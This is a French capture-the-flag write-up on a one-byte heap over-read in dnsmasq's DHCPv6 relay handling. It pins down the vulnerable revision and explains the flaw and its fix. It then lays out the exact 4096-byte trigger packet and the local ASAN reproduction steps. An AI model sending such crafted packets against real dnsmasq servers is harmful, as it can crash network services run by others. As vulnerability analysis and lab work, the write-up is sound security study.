# VULN#002 — relay DHCPv6 de dnsmasq

**Auteur :** lyons

## Détermination de la révision

L'archive livrée ne correspond pas à la release 2.93 : il s'agit d'un snapshot git.
En rapprochant les hashes de chaque fichier de ceux du dépôt amont, on établit la
révision exacte :

    c8168e8  2026-03-10 21:17:41 +0000
    "Don't call qsort() with a NULL array when no servers defined."

Le commit **immédiatement postérieur**, 49 minutes plus tard, constitue le correctif :

    0597828  2026-03-10 22:06:50 +0000
    "Tighten length checking to avoid possible buffer read-overrun in DHCPv6."
    Thanks to Dejan Alvadzijevic for spotting the problem.

## La faille

Au cœur de `src/rfc3315.c`, dans `dhcp6_maybe_relay()` :

    uint8_t *end = inbuff + sz;
    uint8_t *opts = inbuff + 34;
    int msg_type = *inbuff;          // aucune vérification sz >= 4

    ...
    /* must have at least ... 38 */
    if (sz < 38) return 0;

Un paquet `RELAY-FORW` (type 12) portant une option **Relay Message (code 9) de
taille nulle** passe sans être refusé. La récursion relance alors `dhcp6_maybe_relay()`
avec `sz = 0` et un pointeur posé pile sur la fin du paquet : la lecture
`*inbuff` se produit 1 octet après le buffer (heap-buffer-overflow read).

Le correctif :

    if (sz < 4)
      return 0;
    msg_type = *inbuff;

(ainsi qu'un `opt6_first()` pour le pointeur d'options initial).

Remarque : la lecture OOB de la boucle `opt6_next()` (option qui s'arrête à `end-1`)
subsiste dans la version corrigée ; ce n'est donc pas elle qui est visée.

## Le service

- TCP <HOST>:<PORT>
- framing : une longueur sur 4 octets big-endian, puis le paquet DHCPv6 brut
- validation : type 1..14, longueur maximale **4096** (au-delà : `bad length`)
- le paquet est transmis à dnsmasq compilé avec ASAN ; le buffer fait pile la
  taille maximale admise (4096). Un paquet plus court laisse du slack et ne
  provoque rien (`status: no effect`).

## Paquet déclencheur (4096 octets)

    offset 0   : 0c 00                     RELAY-FORW, hop 0
    offset 2   : 16 octets link-address = 0
    offset 18  : 16 octets peer-address = 0
    offset 34  : option type 2, len 4054, data 'C' * 4054
    offset 4092: option type 9, len 0      <-- Relay Message vide en fin de buffer

La récursion lit `*inbuff` à l'offset 4096, soit un débordement d'1 octet.

## Reproduction en local

    git worktree add /tmp/work/dnsmasq-vuln c8168e8
    cd /tmp/work/dnsmasq-vuln
    make CFLAGS="-O1 -g -fsanitize=address" LDFLAGS="-fsanitize=address"

    # dnsmasq dans un netns, conf minimaliste DHCPv6 sur lo
    unshare -rn ./run_local2.sh ./src/dnsmasq zero4096.bin

Sur la version vulnérable :

    ERROR: AddressSanitizer: heap-buffer-overflow
    #0 dhcp6_maybe_relay src/rfc3315.c:115
    #1 dhcp6_maybe_relay src/rfc3315.c:255
    #2 dhcp6_reply      src/rfc3315.c:103

Sur la version corrigée : plus aucun crash.

## Résultat

    status: confirmed
    FLAG: CTF{REDACTED}

Le flag est accepté par la plateforme (`Correct`).
